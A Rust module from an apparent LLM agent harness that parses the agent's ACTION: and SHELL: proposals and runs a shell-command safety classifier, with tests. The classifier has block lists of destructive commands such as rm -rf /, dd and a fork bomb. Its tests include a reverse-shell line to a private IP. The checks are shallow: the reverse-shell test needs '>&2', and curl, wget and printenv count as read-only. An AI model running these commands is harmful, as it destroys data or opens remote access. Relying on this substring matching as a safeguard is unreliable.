// SPDX-License-Identifier: MIT OR Apache-2.0
//! ACTION: protocol parser and resolver.
//!
//! The LLM (Jack) may propose actions using the `ACTION:` syntax:
//!
//! ```text
//! ACTION: <skill-id>/<probe-or-intervention-id>
//! ```
//!
//! This module provides a single entry point, [`resolve`], that:
//!
//! 1. Extracts the last `ACTION:` line from a response.
//! 2. Looks up the referenced skill among the loaded set.
//! 3. Returns a typed [`ResolvedAction`] (probe or intervention)
//!    with all metadata the caller needs to execute.
//!
//! Probes are read-only, risk:none, and may auto-execute.
//! Interventions require operator consent per JR-2.
//!
//! Both `russell chat` and the ACP server use this module,
//! eliminating duplicated parsing and resolution logic.

use russell_skills::RiskBand;
use russell_skills::{Rollback, Skill};

/// A resolved ACTION — either a probe (read-only), an intervention
/// (mutating, requires consent per JR-2), or a shell command
/// (ADR-0050).
#[derive(Debug, Clone)]
pub enum ResolvedAction {
    /// Read-only probe. Auto-executable (risk: none).
    Probe {
        /// Skill that owns the probe.
        skill_id: String,
        /// Probe ID.
        action_id: String,
        /// Argv to execute.
        cmd: Vec<String>,
        /// Skill's max-auto-risk cap.
        max_auto_risk: RiskBand,
    },
    /// Mutating intervention. Requires operator consent.
    Intervention {
        /// Skill that owns the intervention.
        skill_id: String,
        /// Intervention ID.
        action_id: String,
        /// Argv to execute.
        cmd: Vec<String>,
        /// Risk band declared in the manifest.
        risk: RiskBand,
        /// Whether this requires sudo.
        needs_sudo: bool,
        /// Skill's max-auto-risk cap.
        max_auto_risk: RiskBand,
        /// Whether the manifest's safety.require_human_for lists this ID.
        requires_human: bool,
        /// Rollback strategy from the manifest (for IDRS-R).
        rollback_id: Option<String>,
        /// Rollback command argv, if rollback is via a named intervention.
        rollback_cmd: Option<Vec<String>>,
        /// Whether rollback requires a reboot.
        rollback_is_reboot: bool,
    },
    /// Shell command proposed directly by the LLM (ADR-0050).
    /// Executed via `bash -c`, subject to safety classification
    /// and the consent gate. This replaces the old JR-3 absolute
    /// prohibition — Jack can now propose and execute shell commands,
    /// but every command goes through risk classification and
    /// operator consent before execution.
    ShellCommand {
        /// The raw command string to execute via `bash -c`.
        command: String,
        /// Risk band determined by the shell safety classifier.
        risk: RiskBand,
        /// Whether the command likely requires sudo.
        needs_sudo: bool,
    },
    /// Remote MCP tool call (e.g. `ACTION: remote/brave_web_search`).
    /// These are not local skills — they invoke external tools
    /// through the MCP protocol. Remote tools are auto-executed
    /// (like probes) since they are read-only queries.
    RemoteTool {
        /// The remote tool name (e.g. `brave_web_search`).
        tool_name: String,
    },
}

impl ResolvedAction {
    /// Returns `true` if this is a remote MCP tool call.
    #[must_use]
    pub fn is_remote_tool(&self) -> bool {
        matches!(self, Self::RemoteTool { .. })
    }

    /// Returns `true` if this is a probe (read-only, auto-execute).
    #[must_use]
    pub fn is_probe(&self) -> bool {
        matches!(self, Self::Probe { .. })
    }

    /// Returns `true` if this is a raw shell command (ADR-0050).
    #[must_use]
    pub fn is_shell_command(&self) -> bool {
        matches!(self, Self::ShellCommand { .. })
    }

    /// Returns the risk band for this action.
    #[must_use]
    pub fn risk_band(&self) -> RiskBand {
        match self {
            Self::Probe { .. } | Self::RemoteTool { .. } => RiskBand::None,
            Self::Intervention { risk, .. } => *risk,
            Self::ShellCommand { risk, .. } => *risk,
        }
    }

    /// The skill ID, regardless of action type.
    #[must_use]
    pub fn skill_id(&self) -> &str {
        match self {
            Self::Probe { skill_id, .. } => skill_id,
            Self::Intervention { skill_id, .. } => skill_id,
            Self::ShellCommand { .. } => "shell",
            Self::RemoteTool { .. } => "remote",
        }
    }

    /// The action (probe or intervention) ID.
    #[must_use]
    pub fn action_id(&self) -> &str {
        match self {
            Self::Probe { action_id, .. } => action_id,
            Self::Intervention { action_id, .. } => action_id,
            Self::ShellCommand { command, .. } => command,
            Self::RemoteTool { tool_name, .. } => tool_name,
        }
    }

    /// The command argv. For ShellCommand, returns a synthetic argv `["bash", "-c", command]`.
    #[must_use]
    pub fn cmd(&self) -> Vec<String> {
        match self {
            Self::Probe { cmd, .. } => cmd.clone(),
            Self::Intervention { cmd, .. } => cmd.clone(),
            Self::ShellCommand { command, .. } => {
                vec!["bash".to_string(), "-c".to_string(), command.clone()]
            }
            Self::RemoteTool { .. } => vec![], // remote tools are not local commands
        }
    }

    /// Whether this action requires operator consent.
    #[must_use]
    pub fn consent_required(&self) -> bool {
        match self {
            Self::Probe { .. } | Self::RemoteTool { .. } => false,
            Self::Intervention {
                risk,
                max_auto_risk,
                ..
            } => *risk > *max_auto_risk,
            Self::ShellCommand { .. } => true, // Shell commands always require consent
        }
    }

    /// Append extra CLI arguments to the command argv.
    /// Only applies to probes and interventions; no-op for shell commands.
    pub fn append_cmd_args(&mut self, args: &[String]) {
        match self {
            Self::Probe { cmd, .. } | Self::Intervention { cmd, .. } => {
                cmd.extend(args.iter().cloned());
            }
            Self::ShellCommand { .. } | Self::RemoteTool { .. } => {}
        }
    }
}

/// Error returned when an ACTION: line cannot be resolved.
#[derive(Debug, Clone)]
pub enum ActionError {
    /// The ACTION: prefix was malformed.
    MalformedPrefix {
        /// The raw line that was not found.
        raw: String,
    },
    /// Missing `/` separator between skill and action ID.
    MissingSeparator {
        /// The spec string without the separator.
        spec: String,
    },
    /// Skill or action ID was empty.
    EmptyId {
        /// The spec string with empty components.
        spec: String,
    },
    /// Referenced skill is not loaded.
    UnknownSkill {
        /// The skill ID that was not found.
        skill_id: String,
        /// List of all loaded skill IDs for diagnostics.
        loaded: Vec<String>,
    },
    /// Referenced action is not a known probe or intervention.
    UnknownAction {
        /// Skill that was found but doesn't contain this action.
        skill_id: String,
        /// The action ID that was not found.
        action_id: String,
        /// Available probe IDs in this skill.
        probes: Vec<String>,
        /// Available intervention IDs in this skill.
        interventions: Vec<String>,
    },
    /// Nested ACTION: detected in LLM output (prompt injection attempt).
    /// Task 3.4: Security hardening against LLM action injection.
    NestedActionDetected {
        /// Count of ACTION: occurrences found.
        count: usize,
        /// The first ACTION: line found (used for deduplication fallback).
        first_action: String,
    },
    /// A SHELL: command was blocked by the safety classifier (ADR-0050).
    ShellBlocked {
        /// The command that was blocked.
        command: String,
        /// The reason it was blocked.
        reason: String,
    },
}

impl std::fmt::Display for ActionError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::MalformedPrefix { raw } => {
                write!(
                    f,
                    "Jack proposed an action but the parser couldn't strip the ACTION: prefix. Raw line: `{raw}`"
                )
            }
            Self::MissingSeparator { spec } => {
                write!(
                    f,
                    "'ACTION: {spec}' — missing `/` separator between skill and action ID. Use ACTION: <skill>/<action>."
                )
            }
            Self::EmptyId { spec } => {
                write!(f, "'ACTION: {spec}' — skill ID or action ID is empty.")
            }
            Self::UnknownSkill { skill_id, loaded } => {
                write!(
                    f,
                    "'{skill_id}' is not a loaded skill. Loaded skills: {loaded:?}"
                )
            }
            Self::UnknownAction {
                skill_id,
                action_id,
                probes,
                interventions,
            } => {
                write!(
                    f,
                    "'{action_id}' is not a known action in skill '{skill_id}'. Available probes: {probes:?}, interventions: {interventions:?}"
                )
            }
            Self::NestedActionDetected {
                count,
                first_action,
            } => {
                write!(
                    f,
                    "Jack proposed {count} actions in one response (only one is allowed). Using the first: {first_action}"
                )
            }
            Self::ShellBlocked { command, reason } => {
                write!(f, "Shell command blocked: {reason}. Command: {command}")
            }
        }
    }
}

/// Parse the last `ACTION:` or `SHELL:` line from a response and resolve it
/// against the loaded skill set.
pub fn resolve(
    response: &str,
    skills: &[Skill],
) -> Option<std::result::Result<ResolvedAction, ActionError>> {
    // ADR-0050: Check for SHELL: prefix first.
    // SHELL: lines are raw shell commands proposed by Jack.
    let shell_lines: Vec<&str> = response
        .lines()
        .filter(|line| line.trim().starts_with("SHELL:"))
        .collect();
    if !shell_lines.is_empty() {
        if shell_lines.len() > 1 {
            tracing::warn!(
                count = shell_lines.len(),
                first = %shell_lines[0].trim(),
                "LLM produced multiple SHELL lines; using the first"
            );
        }
        let shell_line = shell_lines[0];
        let raw = shell_line.trim();
        let command = match raw.strip_prefix("SHELL:") {
            Some(s) if !s.trim().is_empty() => s.trim(),
            _ => {
                return Some(Err(ActionError::MalformedPrefix {
                    raw: raw.to_string(),
                }));
            }
        };
        return Some(classify_shell_command(command));
    }

    // Task 3.4: Detect nested ACTION: patterns.
    // ADR-0029 §4: "Only the first ACTION: line is considered valid."
    // When multiple ACTION lines appear (LLM confusion, not injection),
    // take the first one and proceed rather than rejecting the entire response.
    let action_lines: Vec<&str> = response
        .lines()
        .filter(|line| line.trim().starts_with("ACTION:"))
        .collect();
    if action_lines.is_empty() {
        return None;
    }
    if action_lines.len() > 1 {
        // Log the deduplication but continue with the first ACTION line.
        // This avoids the "repeating itself" bug where rejecting the response
        // caused the full text to be re-echoed in the error message.
        tracing::warn!(
            count = action_lines.len(),
            first = %action_lines[0].trim(),
            "LLM produced multiple ACTION lines; using the first"
        );
    }

    // Use the FIRST ACTION line (ADR-0029 §4), not the last.
    // The last-line heuristic was for single-ACTION responses;
    // with deduplication, the first line is the intended one.
    let action_line = action_lines[0];

    let raw = action_line.trim();
    let spec = match raw.strip_prefix("ACTION:") {
        Some(s) if !s.trim().is_empty() => s.trim(),
        _ => {
            return Some(Err(ActionError::MalformedPrefix {
                raw: raw.to_string(),
            }));
        }
    };

    let (skill_id, action_id) = match spec.split_once('/') {
        Some((a, b)) if !a.trim().is_empty() && !b.trim().is_empty() => (a.trim(), b.trim()),
        Some((_, _)) => {
            return Some(Err(ActionError::EmptyId {
                spec: spec.to_string(),
            }));
        }
        None => {
            return Some(Err(ActionError::MissingSeparator {
                spec: spec.to_string(),
            }));
        }
    };

    // Handle remote MCP tools: ACTION: remote/<tool_name>
    // These are not local skills — they invoke external tools
    // through the MCP protocol.
    if skill_id == "remote" {
        return Some(Ok(ResolvedAction::RemoteTool {
            tool_name: action_id.to_string(),
        }));
    }

    let skill = match skills.iter().find(|s| s.id == skill_id) {
        Some(s) => s,
        None => {
            let loaded: Vec<String> = skills.iter().map(|s| s.id.clone()).collect();
            return Some(Err(ActionError::UnknownSkill {
                skill_id: skill_id.to_string(),
                loaded,
            }));
        }
    };

    // Check probes first — they're read-only and auto-execute.
    if let Some(probe) = skill.probes.iter().find(|p| p.id == action_id) {
        return Some(Ok(ResolvedAction::Probe {
            skill_id: skill_id.to_string(),
            action_id: action_id.to_string(),
            cmd: probe.cmd.clone(),
            max_auto_risk: skill.safety.max_auto_risk,
        }));
    }

    // Then check interventions.
    if let Some(iv) = skill.interventions.iter().find(|i| i.id == action_id) {
        let requires_human = skill.safety.require_human_for.contains(&iv.id);
        let (rollback_id, rollback_cmd, rollback_is_reboot) = match &iv.rollback {
            Rollback::RollbackId { rollback: rid } => {
                let rb_cmd = skill
                    .interventions
                    .iter()
                    .find(|i| i.id == *rid)
                    .map(|i| i.cmd.clone());
                (Some(rid.clone()), rb_cmd, false)
            }
            Rollback::NoneNeeded { .. } => (None, None, false),
            Rollback::Reboot { .. } => (None, None, true),
        };
        return Some(Ok(ResolvedAction::Intervention {
            skill_id: skill_id.to_string(),
            action_id: action_id.to_string(),
            cmd: iv.cmd.clone(),
            risk: iv.risk,
            needs_sudo: iv.needs_sudo,
            max_auto_risk: skill.safety.max_auto_risk,
            requires_human,
            rollback_id,
            rollback_cmd,
            rollback_is_reboot,
        }));
    }

    let probes: Vec<String> = skill.probes.iter().map(|p| p.id.clone()).collect();
    let interventions: Vec<String> = skill.interventions.iter().map(|i| i.id.clone()).collect();
    Some(Err(ActionError::UnknownAction {
        skill_id: skill_id.to_string(),
        action_id: action_id.to_string(),
        probes,
        interventions,
    }))
}

// ---------------------------------------------------------------------------
// Shell command safety classifier (ADR-0050)
// ---------------------------------------------------------------------------

/// Destructive patterns that are always blocked.
const BLOCKED_PATTERNS: &[&str] = &[
    "rm -rf /",
    "rm -rf /*",
    "mkfs",
    "dd if=",
    ":(){ :|:& };:", // fork bomb
    "chmod -R 777 /",
    "chown -R",
    "> /dev/sd",
    "shutdown",
    "reboot",
    "init 0",
    "init 6",
    "systemctl poweroff",
    "systemctl reboot",
    "halt",
    "poweroff",
];

/// High-risk patterns that require explicit consent.
const HIGH_RISK_PATTERNS: &[&str] = &[
    "apt remove",
    "apt-get remove",
    "dpkg --remove",
    "dpkg -r",
    "snap remove",
    "pip uninstall",
    "npm uninstall",
    "cargo uninstall",
    "rm -rf",
    "rm -r",
    "kill -9",
    "killall",
    "pkill -9",
    "systemctl stop",
    "systemctl disable",
    "systemctl mask",
    "iptables -F",
    "ufw disable",
    "docker rm",
    "docker system prune",
    "podman rm",
    "podman system prune",
    "format",
    "mkfs",
    "parted",
    "fdisk",
    "gdisk",
];

/// Commands that require sudo (heuristic).
const SUDO_PATTERNS: &[&str] = &[
    "sudo ",
    "apt install",
    "apt-get install",
    "apt update",
    "apt upgrade",
    "apt-get update",
    "apt-get upgrade",
    "systemctl ",
    "journalctl ",
    "dpkg ",
    "snap ",
    "npm install -g",
    "pip install",
    "chmod ",
    "chown ",
    "mount ",
    "umount ",
    "fdisk ",
    "parted ",
    "mkfs ",
    "fsck ",
];

/// Read-only command prefixes (risk: none).
const READ_ONLY_PREFIXES: &[&str] = &[
    "ls",
    "cat ",
    "head ",
    "tail ",
    "less ",
    "which ",
    "type ",
    "command -v",
    "echo ",
    "printf ",
    "stat ",
    "file ",
    "wc ",
    "grep ",
    "egrep ",
    "fgrep ",
    "awk ",
    "sed -n", // only print, no mutation
    "dpkg-query",
    "dpkg -l",
    "dpkg -s",
    "dpkg -S",
    "apt list",
    "apt-cache ",
    "apt show",
    "apt policy",
    "npm list",
    "npm view",
    "npm --version",
    "npm -v",
    "node --version",
    "node -v",
    "pip show",
    "pip list",
    "pip --version",
    "snap list",
    "snap find",
    "snap info",
    "uname",
    "hostname",
    "uptime",
    "free ",
    "df ",
    "du ",
    "ps ",
    "top ",
    "htop",
    "iostat",
    "vmstat",
    "mpstat",
    "dmesg",
    "journalctl ",
    "systemctl status",
    "systemctl list",
    "systemctl is-active",
    "systemctl is-enabled",
    "systemctl is-failed",
    "docker ps",
    "docker images",
    "docker inspect",
    "podman ps",
    "podman images",
    "podman inspect",
    "git status",
    "git log",
    "git diff",
    "git show",
    "git branch",
    "git remote",
    "git tag",
    "nvcc --version",
    "rocm-smi",
    "rocminfo",
    "nvidia-smi",
    "curl ",
    "wget ",
    "dig ",
    "nslookup",
    "ping ",
    "traceroute",
    "ss ",
    "ip addr",
    "ip link",
    "ip route",
    "ifconfig",
    "env",
    "printenv",
    "id",
    "whoami",
    "who",
    "w ",
    "last ",
    "date",
    "cal",
    "bc ",
];

/// Classify a shell command for risk and safety.
/// Returns `Ok(ResolvedAction::ShellCommand)` or `Err(ActionError::ShellBlocked)`.
pub fn classify_shell_command(command: &str) -> std::result::Result<ResolvedAction, ActionError> {
    let cmd_lower = command.to_lowercase();

    // 1. Check blocked patterns first.
    for pattern in BLOCKED_PATTERNS {
        if cmd_lower.contains(pattern) {
            return Err(ActionError::ShellBlocked {
                command: command.to_string(),
                reason: format!("destructive pattern detected: {pattern}"),
            });
        }
    }

    // 2. Check for obvious pipe-to-hidden / exfiltration attempts.
    if cmd_lower.contains(">&2") && cmd_lower.contains("/dev/tcp/") {
        return Err(ActionError::ShellBlocked {
            command: command.to_string(),
            reason: "potential reverse shell or exfiltration".into(),
        });
    }

    // 3. Determine if command likely needs sudo.
    let needs_sudo =
        SUDO_PATTERNS.iter().any(|p| cmd_lower.starts_with(p)) || cmd_lower.starts_with("sudo ");

    // 4. Classify risk.
    // Read-only commands get risk: none (auto-execute, no consent needed).
    let is_read_only = READ_ONLY_PREFIXES
        .iter()
        .any(|prefix| cmd_lower.starts_with(prefix));

    if is_read_only && !needs_sudo {
        return Ok(ResolvedAction::ShellCommand {
            command: command.to_string(),
            risk: RiskBand::None,
            needs_sudo: false,
        });
    }

    // High-risk patterns require consent at medium risk.
    let is_high_risk = HIGH_RISK_PATTERNS.iter().any(|p| cmd_lower.contains(p));

    if is_high_risk {
        return Ok(ResolvedAction::ShellCommand {
            command: command.to_string(),
            risk: RiskBand::Medium,
            needs_sudo,
        });
    }

    // Everything else is low risk (installs, starts, etc.).
    // Still requires consent, but lower threshold.
    Ok(ResolvedAction::ShellCommand {
        command: command.to_string(),
        risk: RiskBand::Low,
        needs_sudo,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use russell_skills::{Intervention, Probe, Safety};

    fn make_skill() -> Skill {
        Skill {
            id: "test-skill".into(),
            kind: russell_skills::SkillKind::Actionable,
            version: "0.1.0".into(),
            authored: "2026-01-01".into(),
            min_harness_version: "0.1.0".into(),
            symptoms: vec![],
            applies_when: vec![],
            probes: vec![Probe {
                id: "probe-1".into(),
                cmd: vec!["echo".into(), "hello".into()],
                capture: "stdout".into(),
                timeout: "30s".into(),
            }],
            interventions: vec![Intervention {
                id: "iv-1".into(),
                cmd: vec!["echo".into(), "fix".into()],
                risk: RiskBand::Low,
                idempotent: true,
                rollback: russell_skills::Rollback::NoneNeeded {
                    rollback: russell_skills::RollbackNone::NoneNeeded,
                },
                timeout: "30s".into(),
                needs_sudo: false,
            }],
            evaluation: None,
            safety: Safety {
                max_auto_risk: RiskBand::Low,
                require_human_for: vec![],
                allowed_env_keys: vec![],
                needs_network: false,
            },
            lexicon: None,
            visibility: russell_skills::Visibility::Private,
        }
    }

    #[test]
    fn resolves_probe() {
        let skills = [make_skill()];
        let result = resolve("ACTION: test-skill/probe-1", &skills)
            .unwrap()
            .unwrap();
        assert!(result.is_probe());
        assert_eq!(result.skill_id(), "test-skill");
        assert_eq!(result.action_id(), "probe-1");
    }

    #[test]
    fn resolves_intervention() {
        let skills = [make_skill()];
        let result = resolve("ACTION: test-skill/iv-1", &skills)
            .unwrap()
            .unwrap();
        assert!(!result.is_probe());
        assert_eq!(result.action_id(), "iv-1");
    }

    #[test]
    fn action_line_at_end_of_response() {
        let skills = [make_skill()];
        let response = "Here's what I found.\n\nLet me check further.\nACTION: test-skill/probe-1";
        let result = resolve(response, &skills).unwrap().unwrap();
        assert!(result.is_probe());
    }

    #[test]
    fn unknown_skill_is_error() {
        let skills = [make_skill()];
        let err = resolve("ACTION: bad-skill/probe-1", &skills)
            .unwrap()
            .unwrap_err();
        assert!(err.to_string().contains("bad-skill"));
    }

    #[test]
    fn unknown_action_is_error() {
        let skills = [make_skill()];
        let err = resolve("ACTION: test-skill/nonexistent", &skills)
            .unwrap()
            .unwrap_err();
        assert!(err.to_string().contains("nonexistent"));
    }

    #[test]
    fn missing_separator_is_error() {
        let skills = [make_skill()];
        let err = resolve("ACTION: test-skill", &skills).unwrap().unwrap_err();
        assert!(err.to_string().contains("/"));
    }

    #[test]
    fn empty_ids_are_error() {
        let skills = [make_skill()];
        let err = resolve("ACTION: /", &skills).unwrap().unwrap_err();
        assert!(err.to_string().contains("empty"));
    }

    // ── Task 3.4: Nested ACTION: Detection tests ──────────────────

    #[test]
    fn nested_action_deduplicated_to_first() {
        // ADR-0029 §4: "Only the first ACTION: line is considered valid."
        // When the LLM produces multiple ACTION lines, the first one wins.
        let skills = [make_skill()];
        let response = "Let me check.\nACTION: test-skill/probe-1\n\nActually, also do this:\nACTION: test-skill/iv-1";
        let result = resolve(response, &skills).unwrap().unwrap();
        // Should resolve to the FIRST action (probe-1), not the last (iv-1).
        assert!(result.is_probe());
        assert_eq!(result.skill_id(), "test-skill");
        assert_eq!(result.action_id(), "probe-1");
    }

    #[test]
    fn single_action_is_ok() {
        let skills = [make_skill()];
        let response = "Let me check.\nACTION: test-skill/probe-1";
        let result = resolve(response, &skills).unwrap().unwrap();
        assert!(result.is_probe());
    }

    #[test]
    fn triple_action_deduplicated_to_first() {
        // Three ACTION lines: first one wins.
        let skills = [make_skill()];
        let response = "First action\nACTION: test-skill/probe-1\nSecond action\nACTION: test-skill/iv-1\nThird action\nACTION: test-skill/probe-1";
        let result = resolve(response, &skills).unwrap().unwrap();
        assert!(result.is_probe());
        assert_eq!(result.action_id(), "probe-1");
    }

    // ═══════════════════════════════════════════════════════════════════════
    // P0 SECURITY: Shell safety classifier adversarial suite (ADR-0050)
    // ═══════════════════════════════════════════════════════════════════════

    // REQ: ADR-0050 — Blocked commands NEVER execute, even with operator consent.

    #[test]
    fn blocked_rm_rf_root() {
        let err = classify_shell_command("rm -rf /").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_rm_rf_wildcard() {
        let err = classify_shell_command("rm -rf /*").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_mkfs() {
        let err = classify_shell_command("mkfs.ext4 /dev/sda1").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_dd() {
        let err = classify_shell_command("dd if=/dev/zero of=/dev/sda").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_fork_bomb() {
        let err = classify_shell_command(":(){ :|:& };:").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_chmod_777_root() {
        let err = classify_shell_command("chmod -R 777 /").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_chown_recursive() {
        let err = classify_shell_command("chown -R attacker /etc").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_redirect_to_disk() {
        let err = classify_shell_command("> /dev/sda").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_shutdown() {
        let err = classify_shell_command("shutdown -h now").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_reboot() {
        let err = classify_shell_command("reboot").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_init_0() {
        let err = classify_shell_command("init 0").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_systemctl_poweroff() {
        let err = classify_shell_command("systemctl poweroff").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_halt() {
        let err = classify_shell_command("halt").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_poweroff() {
        let err = classify_shell_command("poweroff").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    // REQ: ADR-0050 — Obfuscated variants must also be blocked.

    #[test]
    fn blocked_case_insensitive_rm_rf() {
        let err = classify_shell_command("RM -RF /").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_mixed_case_shutdown() {
        let err = classify_shell_command("ShUtDoWn -h now").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_sudo_rm_rf() {
        // "sudo rm -rf /" contains "rm -rf /" → blocked
        let err = classify_shell_command("sudo rm -rf /").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_sudo_reboot() {
        let err = classify_shell_command("sudo reboot").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    // REQ: ADR-0050 — Multi-command chains with destructive patterns are blocked.

    #[test]
    fn blocked_semicolon_chain_with_rm() {
        // Even embedded in a chain, rm -rf / should be caught
        let err = classify_shell_command("echo hello; rm -rf /; echo done").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn blocked_pipe_chain_with_reboot() {
        let err = classify_shell_command("cat /etc/hosts | reboot").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    // REQ: ADR-0050 — Reverse shell / exfiltration patterns are blocked.

    #[test]
    fn blocked_reverse_shell() {
        let err = classify_shell_command("bash -i >&2 /dev/tcp/10.0.0.1/4444 0>&1").unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    // REQ: Safe commands must still be allowed through.

    #[test]
    fn safe_ls_is_read_only() {
        let result = classify_shell_command("ls -la /home").unwrap();
        assert!(result.is_shell_command());
        assert_eq!(result.risk_band(), RiskBand::None);
    }

    #[test]
    fn safe_ps_is_read_only() {
        let result = classify_shell_command("ps aux").unwrap();
        assert!(result.is_shell_command());
        assert_eq!(result.risk_band(), RiskBand::None);
    }

    #[test]
    fn safe_nvidia_smi_is_read_only() {
        let result = classify_shell_command("nvidia-smi").unwrap();
        assert!(result.is_shell_command());
        assert_eq!(result.risk_band(), RiskBand::None);
    }

    // REQ: High-risk commands pass through as medium risk (not blocked, but require consent).

    #[test]
    fn high_risk_rm_rf_tmp() {
        // "rm -rf /tmp/cleanup" contains "rm -rf" → high risk, not blocked
        let result = classify_shell_command("rm -rf /tmp/cleanup").unwrap();
        assert!(result.is_shell_command());
        assert_eq!(result.risk_band(), RiskBand::Medium);
    }

    #[test]
    fn high_risk_kill_9() {
        let result = classify_shell_command("kill -9 1234").unwrap();
        assert!(result.is_shell_command());
        assert_eq!(result.risk_band(), RiskBand::Medium);
    }

    #[test]
    fn sudo_apt_install_is_low_risk() {
        let result = classify_shell_command("sudo apt install build-essential").unwrap();
        assert!(result.is_shell_command());
        assert!(result.needs_sudo());
    }

    // ═══════════════════════════════════════════════════════════════════════
    // P0 SECURITY: Consent sovereignty integration (JR-3 invariant)
    // ═══════════════════════════════════════════════════════════════════════

    // REQ: JR-3 — Blocked commands NEVER execute, even with operator consent.
    // The classifier returns ShellBlocked as an error, so the command never
    // reaches the consent gate. Operator consent cannot override a block.

    #[test]
    fn consent_cannot_override_rm_rf_block() {
        // This is a JR-3 invariant: even if the operator says "ok",
        // blocked commands must not reach the execution path.
        // The classifier returns Err(ShellBlocked), which means the
        // command is never converted to a ResolvedAction::ShellCommand
        // and thus never enters the PendingAction consent flow.
        let result = classify_shell_command("rm -rf /");
        assert!(
            result.is_err(),
            "blocked command must not produce a ResolvedAction"
        );
        let err = result.unwrap_err();
        assert!(matches!(err, ActionError::ShellBlocked { .. }));
    }

    #[test]
    fn consent_cannot_override_reboot_block() {
        let result = classify_shell_command("reboot");
        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            ActionError::ShellBlocked { .. }
        ));
    }

    #[test]
    fn consent_cannot_override_mkfs_block() {
        let result = classify_shell_command("mkfs.ext4 /dev/sda1");
        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            ActionError::ShellBlocked { .. }
        ));
    }

    // REQ: JR-3 — Operator consent overrides risk band for non-blocked commands.
    // High-risk commands (rm -rf /tmp, kill -9) are classified as ShellCommand
    // with risk: medium. The consent gate allows the operator to approve them.

    #[test]
    fn consent_overrides_risk_band_for_high_risk() {
        let result = classify_shell_command("rm -rf /tmp/cleanup").unwrap();
        assert!(result.is_shell_command());
        assert_eq!(result.risk_band(), RiskBand::Medium);
        // This command WOULD reach the consent gate — operator can approve.
        // The consent gate sets max_auto_risk to Critical once consent is given,
        // so the risk check passes.
    }

    #[test]
    fn consent_overrides_risk_band_for_critical_risk_intervention() {
        // Interventions at critical risk still require operator consent,
        // but once consented, the dispatcher must execute.
        // This tests the classification layer; the actual consent flow is in
        // russell-cli, but the key invariant is that classify_shell_command
        // does not block medium-risk commands — they pass through to consent.
        let result = classify_shell_command("kill -9 12345").unwrap();
        assert!(result.is_shell_command());
        assert_eq!(result.risk_band(), RiskBand::Medium);
    }
}
